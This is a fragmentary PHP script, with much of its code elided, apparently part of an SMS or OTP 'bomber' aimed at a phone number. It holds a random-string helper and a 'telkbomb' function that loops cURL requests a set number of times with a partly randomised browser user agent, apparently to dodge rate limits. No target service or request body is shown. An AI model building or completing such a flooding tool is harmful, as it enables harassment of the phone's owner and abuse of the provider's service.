<?php
function auto($panjang)
    {
        $karakter = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890_';
        $string   = '';
        for ($i = 0; $i < $panjang; $i++) {
...
function telkbomb($no, $jum, $wait){
    ...
    while($x < $jum) {
        ...
        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, '.auto(5).') Chrome/58.0.3029.110 Safari/537.36');
